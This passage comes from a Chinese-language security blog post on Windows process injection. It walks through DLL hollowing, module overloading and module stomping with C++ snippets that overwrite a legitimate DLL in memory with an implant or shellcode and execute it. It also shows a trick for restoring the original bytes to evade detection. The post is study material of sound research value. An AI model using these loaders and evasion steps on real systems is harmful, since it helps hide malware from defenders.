+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">	&#x2F;&#x2F; tapi32.dll</span><br><span class="line">	std::cout &lt;&lt; &quot;target_dll: &quot; &lt;&lt; dll_name &lt;&lt; &quot;\n&quot;;</span><br><span class="line">	&#x2F;&#x2F; evil code</span><br><span class="line">	std::cout &lt;&lt; &quot;implant_dll: &quot; &lt;&lt; implant_name &lt;&lt; &quot;\n&quot;;</span><br><span class="line">	...</span><br><span class="line">	size_t raw_size &#x3D; 0;</span><br><span class="line">	&#x2F;&#x2F; 将evil code的文件原始内容分配到buffer中</span><br><span class="line">	BYTE *raw_payload &#x3D; peconv::load_file(implant_name, raw_size);</span><br><span class="line"></span><br><span class="line">#ifdef _DEBUG</span><br><span class="line">	std::cerr &lt;&lt; &quot;[+] Raw implant loaded\n&quot;;</span><br><span class="line">#endif</span><br><span class="line">	&#x2F;&#x2F; 判断符合系统位数</span><br><span class="line">	if (!is_compatibile(raw_payload)) &#123;</span><br><span class="line">		system(&quot;pause&quot;);</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>开始镂空（module_overloader）通过将PE映射到内存，处理导入导出表后，将合法Dll内存覆写。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 模块重载</span><br><span class="line">LPVOID mapped &#x3D; module_overloader(raw_payload, raw_size, dll_name);</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">PVOID module_overloader(BYTE* raw_payload, size_t raw_size, char *target_dll)</span><br><span class="line">&#123;</span><br><span class="line">	&#x2F;&#x2F; 将 PE 从给定缓冲区加载到内存将其映射为虚拟格式</span><br><span class="line">	BYTE* payload &#x3D; peconv::load_pe_module(raw_payload, raw_size, payload_size, false, false);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; 加载payload导入表</span><br><span class="line">	peconv::load_imports(payload)</span><br><span class="line">	</span><br><span class="line">	&#x2F;&#x2F; 通过 *LoadLibraryEx* 返回Dll地址</span><br><span class="line">	PVOID mapped &#x3D; load_target_dll(target_dll);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Relocate the payload into the target base:</span><br><span class="line">	&#x2F;&#x2F; payload到Dll地址重定向问题</span><br><span class="line">	peconv::relocate_module(payload, payload_size, (ULONGLONG)mapped)</span><br><span class="line">	</span><br><span class="line">	&#x2F;&#x2F; Overwrite the target DLL with the payload</span><br><span class="line">	&#x2F;&#x2F; 将payload覆盖到Dll内</span><br><span class="line">	overwrite_mapping(mapped, payload, payload_size)</span><br><span class="line"></span><br><span class="line">	return mapped;</span><br><span class="line">&#125;</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">&#x2F;&#x2F;覆盖Dll：overwrite_mapping</span><br><span class="line">bool overwrite_mapping(PVOID mapped, BYTE* implant_dll, size_t implant_size)</span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hProcess &#x3D; GetCurrentProcess();</span><br><span class="line">	</span><br><span class="line">	&#x2F;&#x2F;cleanup previous module:</span><br><span class="line">	</span><br><span class="line">	size_t prev_size &#x3D; peconv::get_image_size((BYTE*)mapped);</span><br><span class="line">	&#x2F;&#x2F;将Dll全部置0</span><br><span class="line">	if (prev_size) &#123;</span><br><span class="line">		if (!VirtualProtect((LPVOID)mapped, prev_size, PAGE_READWRITE, &amp;oldProtect)) return false;</span><br><span class="line">		memset(mapped, 0, prev_size);</span><br><span class="line">		if (!VirtualProtect((LPVOID)mapped, prev_size, PAGE_READONLY, &amp;oldProtect)) return false;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if (!VirtualProtect((LPVOID)mapped, implant_size, PAGE_READWRITE, &amp;oldProtect)) &#123;</span><br><span class="line">		&#x2F;&#x2F; 判断加载Dll的内存大小与evil code大小，后者不能比前者大</span><br><span class="line">		if (implant_size &gt; prev_size) &#123;</span><br><span class="line">			std::cout &lt;&lt; &quot;[-] The implant is too big for the target!\n&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		return false;</span><br><span class="line">	&#125;</span><br><span class="line">	&#x2F;&#x2F; 由于二者都已经映像了，所以直接将evil code 复制过去</span><br><span class="line">	memcpy(mapped, implant_dll, implant_size);</span><br><span class="line">	is_ok &#x3D; true;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; 设置各个节的正确权限属性</span><br><span class="line">	if (!set_sections_access(mapped, implant_dll, implant_size)) &#123;</span><br><span class="line">		is_ok &#x3D; false;</span><br><span class="line">	&#125;</span><br><span class="line">	return is_ok;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在镂空重写后，获取偏移，执行入口点 :)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 获取evil code到入口点的RVA</span><br><span class="line">DWORD ep_rva &#x3D; peconv::get_entry_point_rva(raw_payload);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 检查evil code是不是Dll</span><br><span class="line">bool is_dll &#x3D; peconv::is_module_dll(raw_payload);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 释放原始evil code</span><br><span class="line">peconv::free_file(raw_payload); raw_payload &#x3D; nullptr;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 执行payload</span><br><span class="line">&#x2F;&#x2F; Dll：执行入口点 exe：指针执行</span><br><span class="line">int ret &#x3D; run_implant(mapped, ep_rva, is_dll);</span><br></pre></td></tr></table></figure>
+
+<p>那么整个流程如图所示：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1720327600259.png" alt="QQ_1720327600259"></p>
+<p>效果：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240707153548533.png" alt="image-20240707153548533"></p>
+<h3 id="Module-Overloading"><a href="#Module-Overloading" class="headerlink" title="Module Overloading"></a>Module Overloading</h3><p>该部分思路同上，只是项目中使用了 <strong>映射注入（Mapping Injection）</strong>便归类到Module Overloading中，其实只是技术细节有差别，利用思路大同小异。特点：项目通过 <strong>映射技术之一：NtCreateSection + NtMapViewOfSection 引入合法Dll</strong> 映射到本地进程（也可以映射到远程进程）并直接修改。对该部分的本地视图的更改也会导致远程视图被修改。这里通过使用映射避免使用 <strong>LoadLibrary系列API</strong> </p>
+<p>首先介绍映射技术大体思路：通过一些系统函数组合将磁盘中的文件直接映射到虚拟内存中，将恶意PE进行覆盖或shellcode填充，执行入口。</p>
+<p>有以下几条实现方法 <a target="_blank" rel="noopener" href="https://github.com/izj007/wechat/blob/main/articles/%5Bsnowming%5D-2021-8-15-%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E6%98%A0%E5%B0%84%E8%BF%9B%E8%A1%8C%E8%BF%9C%E7%A8%8B%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5.md">使用文件映射进行远程进程注入</a>：</p>
+<ul>
+<li>CreateFileMapping → MapViewOfFile  → MapViewOfFile2</li>
+<li>NtCreateSection → NtMapViewOfSection（项目采用方式）</li>
+<li>CreateFileMapping →  MapViewOfFile → NtMapViewOfSection（cobalt strike采用方式）</li>
+</ul>
+<p>那么在项目中代码区别如下，不再使用 LoadLibrary，而是使用映射技术：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PVOID load_target_dll(const char* dll_name)</span><br><span class="line">&#123;</span><br><span class="line">#ifdef CLASSIC_HOLLOWING</span><br><span class="line">	std::cout &lt;&lt; &quot;[*] Loading the DLL (using LoadLibary)...\n&quot;;</span><br><span class="line">	&#x2F;&#x2F;return LoadLibraryA(dll_name);</span><br><span class="line">	return LoadLibraryEx(dll_name, NULL, DONT_RESOLVE_DLL_REFERENCES);</span><br><span class="line">#else</span><br><span class="line">	std::cout &lt;&lt; &quot;[*] Mapping the DLL image...\n&quot;;</span><br><span class="line">	return map_dll_image(dll_name);</span><br><span class="line">#endif</span><br><span class="line">&#125;</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">PVOID map_dll_image(const char* dll_name)</span><br><span class="line">&#123;</span><br><span class="line">	&#x2F;&#x2F; 创建合法Dll文件对象</span><br><span class="line">	HANDLE hFile &#x3D; CreateFileA(dll_name,</span><br><span class="line">		GENERIC_READ,</span><br><span class="line">		0,</span><br><span class="line">		NULL,</span><br><span class="line">		OPEN_EXISTING,</span><br><span class="line">		FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">		NULL</span><br><span class="line">	);</span><br><span class="line">	HANDLE hSection &#x3D; nullptr;</span><br><span class="line">	&#x2F;&#x2F; 为文件对象创建一个section</span><br><span class="line">	NTSTATUS status &#x3D; NtCreateSection(&amp;hSection,</span><br><span class="line">		SECTION_ALL_ACCESS,</span><br><span class="line">		NULL,</span><br><span class="line">		0,</span><br><span class="line">		PAGE_READONLY,</span><br><span class="line">		SEC_IMAGE,</span><br><span class="line">		hFile</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	DWORD protect &#x3D; PAGE_EXECUTE_READWRITE;</span><br><span class="line">	PVOID sectionBaseAddress &#x3D; NULL;</span><br><span class="line">	SIZE_T viewSize &#x3D; 0;</span><br><span class="line">	SECTION_INHERIT inheritDisposition &#x3D; ViewShare; &#x2F;&#x2F;VIEW_SHARE</span><br><span class="line">	&#x2F;&#x2F; 将section映射到内存中</span><br><span class="line">	if ((status &#x3D; NtMapViewOfSection(hSection,</span><br><span class="line">		NtCurrentProcess(),</span><br><span class="line">		&amp;sectionBaseAddress,</span><br><span class="line">		NULL,</span><br><span class="line">		NULL,</span><br><span class="line">		NULL,</span><br><span class="line">		&amp;viewSize,</span><br><span class="line">		inheritDisposition,</span><br><span class="line">		NULL,</span><br><span class="line">		protect)</span><br><span class="line">		) !&#x3D; STATUS_SUCCESS)</span><br><span class="line">	&#x2F;&#x2F; 返回基址</span><br><span class="line">	return sectionBaseAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>效果：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1720374014934.png" alt="QQ_1720374014934"></p>
+<h3 id="Module-Stomping"><a href="#Module-Stomping" class="headerlink" title="Module Stomping"></a>Module Stomping</h3><p>模块踩踏原理同上面二者，主要区别为Stomping不再执行复杂的PE展开、获取偏移、执行入口，而是直接将shellcode覆写到合法Dll中的区域，并且直接执行，由PE加载转为了直接的shellcode加载。</p>
+<p>特点：<strong>将 shellcode 写入到section中，直接获取地址执行</strong></p>
+<p>流程如图：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1720453398400.png" alt="QQ_1720453398400"></p>
+<p>关键代码，通过LoadLibraryEx获取Dll基址，再获取入口点地址，然后覆写、执行shellcode</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DWORD oldProtect &#x3D; 0;</span><br><span class="line">VirtualProtect((LPVOID)entryPointAddress, length, PAGE_READWRITE, &amp;oldProtect);</span><br><span class="line">memcpy(entryPointAddress, shellcode, length);</span><br><span class="line">memset(shellcode, 0, length);</span><br><span class="line">VirtualProtect((LPVOID)entryPointAddress, length, PAGE_EXECUTE_READ, &amp;oldProtect);</span><br><span class="line">HANDLE hThread &#x3D; CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entryPointAddress, NULL, 0, NULL);</span><br><span class="line">WaitForSingleObject(hThread, INFINITE);</span><br></pre></td></tr></table></figure>
+
+<p>效果，检测的IOC发现.text段的改变，该问题产生原因是由于覆写shellcode导致检测到磁盘中Dll与内存中的.text段内容不同。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1720452184625.png" alt="QQ_1720452184625"></p>
+<p>入口点被覆写为shellcode</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1720452376761.png" alt="QQ_1720452376761"></p>
+<p>为了去除shellcode在内存中的痕迹，可以在执行完shellcode后，将原始内容进行填充，这样避免这一IOC。</p>
+<p>流程图如下：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1720453700693.png" alt="QQ_1720453700693"></p>
+<p>关键代码如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unsigned char* buffer &#x3D; new unsigned char[length];</span><br><span class="line">memcpy(buffer, entryPointAddress, length);</span><br><span class="line">DWORD oldProtect &#x3D; 0;</span><br><span class="line">VirtualProtect((LPVOID)entryPointAddress, length, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">memcpy(entryPointAddress, shellcode, length);</span><br><span class="line">memset(shellcode, 0, length);</span><br><span class="line">HANDLE hThread &#x3D; CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entryPointAddress, NULL, 0, NULL);</span><br><span class="line">Sleep(2000);</span><br><span class="line">memmove(entryPointAddress,buffer,length);</span><br><span class="line">VirtualProtect((LPVOID)entryPointAddress, length, PAGE_EXECUTE_READ, &amp;oldProtect);</span><br><span class="line">cout &lt;&lt; &quot;[*] Done&quot; &lt;&lt; endl;</span><br><span class="line">WaitForSingleObject(hThread, INFINITE);</span><br></pre></td></tr></table></figure>
+
+<h3 id="关于远程注入"><a href="#关于远程注入" class="headerlink" title="关于远程注入"></a>关于远程注入</h3><p>上面所有的DLL Hollowing例子都是自身进程在没有开启CFG（Control Flow Guard）时才能正常运行，在实现远程进程注入时，如果目标开启CFG保护，会抛出CFG异常从而运行失败，关于更多CFG下篇再学习。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-274131.htm">实战dll注入(原理, 踩坑及排雷)</a></p>
+<p>反射Dll：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/h2zZhou/p/7721797.html">DLL注入新姿势：反射式DLL注入研究 - h2z</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11072?time__1311=mqmx0DyDuDBDcDAxxBuQx2GUQ40ITvhRAD&alichlgref=https://">深入理解反射式dll注入技术</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14639?time__1311=mqmx9Q0=uGDsD7CG7bTDteD=yoC+DQwD&alichlgref=https://cn.bing.com/">反射DLL注入原理解析</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/sud01oo/ProcessInjection">https://github.com/sud01oo/ProcessInjection</a></p>
+<p>DLL Hollowing：</p>
+<p><a target="_blank" rel="noopener" href="https://naksyn.com/edr%20evasion/2023/06/01/improving-the-stealthiness-of-memory-injections.html">Improving the stealthiness of memory injections techniques</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.blackhillsinfosec.com/dll-jmping/">DLL Jmping: Old Hollow Trampolines in Windows DLL Land</a></p>
+<p><a target="_blank" rel="noopener" href="https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide">Burrowing a Hollow in a DLL to Hide</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing">Masking Malicious Memory Artifacts – Part I: Phantom DLL Hollowing</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.secforce.com/blog/dll-hollowing-a-deep-dive-into-a-stealthier-memory-allocation-variant/">DLL Hollowing</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.f-secure.com/hiding-malicious-code-with-module-stomping/">Hiding malicious code with “Module Stomping”</a></p>
+<p>映射注入：</p>
+<p><a target="_blank" rel="noopener" href="https://idiotc4t.com/code-and-dll-process-injection/mapping-injection">https://idiotc4t.com/code-and-dll-process-injection/mapping-injection</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/izj007/wechat/blob/main/articles/%5Bsnowming%5D-2021-8-15-%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E6%98%A0%E5%B0%84%E8%BF%9B%E8%A1%8C%E8%BF%9C%E7%A8%8B%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5.md">使用文件映射进行远程进程注入</a></p>
+<p>CFG：</p>
+<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-277740.htm">利用CFG寻找潜在的ShellCode内存</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+            </div>
+            <div class="post-nav-item">
+                <a href="/2024/09/03/Process-Injection2/" rel="next" title="Process-Inject-贰">
+                  Process-Inject-贰 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Y0ng</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
